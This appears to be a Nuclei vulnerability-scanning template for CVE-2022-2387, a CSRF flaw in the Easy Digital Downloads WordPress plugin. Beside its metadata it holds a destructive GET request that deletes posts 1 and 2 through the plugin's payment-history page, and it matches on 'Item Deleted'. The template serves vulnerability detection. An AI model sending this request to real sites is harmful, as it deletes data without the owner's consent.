id: CVE-2022-2387

info:
  name: Easy Digital Downloads Arbitrary Post Deletion via CSRF
  author: ProjectDiscoveryAI
  severity: medium
  description: The Easy Digital Downloads WordPress plugin before 3.0 does not have CSRF check in place when deleting payment history, and does not ensure that the post to be deleted is actually a payment history. As a result, attackers could make a logged in admin delete arbitrary post via a CSRF attack.
  impact: |
    An attacker can delete arbitrary posts on the website.
  remediation: |
    Update Easy Digital Downloads plugin to the latest version to mitigate the CSRF vulnerability.
  reference:
    - https://wpscan.com/vulnerability/db3c3c78-1724-4791-9ab6-ebb2e8a4c8b8
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
    cvss-score: 4.3
    cve-id: CVE-2022-2387
    cwe-id: CWE-352
    epss-score: 0.00061
    epss-percentile: 0.27417
    cpe: cpe:2.3:a:sandhillsdev:easy_digital_downloads:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: sandhillsdev
    product: easy_digital_downloads
    framework: wordpress
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/edit.php?post_type=download&page=edd-payment-history&payment%5B0%5D=1&payment%5B1%5D=2&action=delete"

    matchers:
      - type: word
        words:
          - "Item Deleted"
          - "Deletion Successful"
        part: body
        condition: or
